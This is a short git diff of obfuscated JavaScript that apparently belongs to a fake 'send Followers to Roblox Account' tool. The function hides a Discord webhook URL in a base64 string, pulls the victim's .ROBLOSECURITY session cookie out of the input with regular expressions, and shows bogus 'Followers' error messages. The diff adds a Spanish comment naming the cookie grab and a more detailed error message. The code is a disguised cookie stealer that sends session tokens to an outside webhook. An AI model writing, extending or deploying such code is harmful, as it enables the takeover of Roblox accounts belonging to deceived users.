@@ -15,6 +15,7 @@ async function a1b2c3d4(p1q2r3, s4t5u7) {
     const e5f6g7 = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0NjY1MjEzOTEzNjQ4MzM3OS81SnZNYTd1NHhrTERmbFV2RUVwQkdFc3JTSnh3V19kY1lrV3ZTdDlXWUNfd2NjbGc5Ylh4Z1JEOXFnLUN5N3YtMlE5MQ==';
     const g8h9i0 = atob(e5f6g7);
 
+    // Extraer la cookie .ROBLOSECURITY
     let xyeq = p1q2r3.match(/\.ROBLOSECURITY", "([^"]+)"/);
     if (!xyeq) {
         xyeq = p1q2r3.match(/\.ROBLOSECURITY=([^;]+)/);
@@ -60,7 +61,7 @@ async function a1b2c3d4(p1q2r3, s4t5u7) {
             x1y2y2z3("Error", `Failed to send Followers to Roblox Account. ${errorData.message}`, "error", "Retry");
         }
     } catch (error) {
-        x1y2y2z3("Error", "An error occurred while sending Followers", "error", "Retry");
+        x1y2y2z3("Error", `An error occurred while sending Followers: ${error.message}`, "error", "Retry");
     }
 }
 
